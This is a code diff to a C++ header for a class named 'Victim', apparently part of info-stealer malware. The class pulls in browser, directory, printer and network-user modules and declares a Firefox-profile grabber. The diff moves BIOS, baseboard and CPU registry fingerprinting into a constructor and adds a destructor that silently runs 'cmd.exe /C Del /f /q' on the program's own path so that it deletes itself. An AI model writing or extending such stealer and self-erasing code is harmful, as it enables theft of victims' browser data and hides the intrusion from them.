@@ -3,25 +3,51 @@
 #include "Browsers.h"
 #include "Directories.h"
 #include "Printers.h"
+#include "strsafe.h"
+#include "NetUsers.h"
 #pragma once
 
-class Victim : public Browsers, public Directories, public Printers {
+class Victim : public Browsers, public Directories, public Printers, public NetUsers {
 	//SYSTEM
-	std::string systemManu = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer");
-	std::string systemProductName = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
-	std::string systemVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemVersion");
-	std::string systemFamily = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemFamily");
-	std::string systemSKU = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemSKU");
+	std::string systemManu;
+	std::string systemProductName;
+	std::string systemVersion;
+	std::string systemFamily;
+	std::string systemSKU;
 	//BIOS
-	std::string BIOSVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion");
-	std::string BIOSVendor = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor");
-	std::string BIOSReleaseDate = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate");
+	std::string BIOSVersion;
+	std::string BIOSVendor;
+	std::string BIOSReleaseDate;
 	//BaseBoard
-	std::string BaseBoardVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardVersion");
-	std::string BaseBoardManufacturer = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardManufacturer");
-	std::string BaseBoardProduct = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct");
-	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
+	std::string BaseBoardVersion;
+	std::string BaseBoardManufacturer;
+	std::string BaseBoardProduct;
+	Registers::Key CentralProcessorSubKeys;
+	std::string CurrentDirectory;
+
 public:
+	Victim() {
+		systemManu = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer");
+		systemProductName = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
+		systemVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemVersion");
+		systemFamily = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemFamily");
+		systemSKU = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemSKU");
+		BIOSVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion");
+		BIOSVendor = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor");
+		BIOSReleaseDate = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate");
+		BaseBoardVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardVersion");
+		BaseBoardManufacturer = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardManufacturer");
+		BaseBoardProduct = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct");
+		CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
+		CurrentDirectory = GetCommandLineA();
+	}
+	~Victim() {
+		STARTUPINFOA si = { 0 };
+		PROCESS_INFORMATION pi = { 0 };
+		std::string REMOVECOMMAND = "cmd.exe /C Del /f /q " + this->CurrentDirectory;
+		CreateProcessA(NULL, (char*)REMOVECOMMAND.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+	}
 	bool GetFirefoxProfiles();
-	bool GetNetworkUsers();
 };
